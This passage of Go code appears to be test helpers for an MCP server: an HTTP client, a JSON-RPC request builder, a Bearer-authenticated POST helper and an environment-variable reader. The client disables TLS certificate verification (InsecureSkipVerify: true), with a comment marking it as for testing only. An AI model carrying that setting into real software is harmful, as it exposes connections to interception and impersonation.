				InsecureSkipVerify: true, // Only for testing
			},
		},
	}
}

func createMCPRequest(id, method string, params interface{}) []byte {
	request := map[string]interface{}{
		"jsonrpc": "2.0",
		"id":      id,
		"method":  method,
	}

	if params != nil {
		request["params"] = params
	}

	data, _ := json.Marshal(request)
	return data
}

func makeRequest(client *http.Client, url string, requestData []byte, authHeader string) (*http.Response, error) {
	req, err := http.NewRequest("POST", url, bytes.NewReader(requestData))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json")
	if authHeader != "" {
		if strings.HasPrefix(authHeader, "Bearer ") {
			req.Header.Set("Authorization", authHeader)
		} else {
			req.Header.Set("Authorization", "Bearer "+authHeader)
		}
	}

	return client.Do(req)
}

func getEnvOrDefault(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}
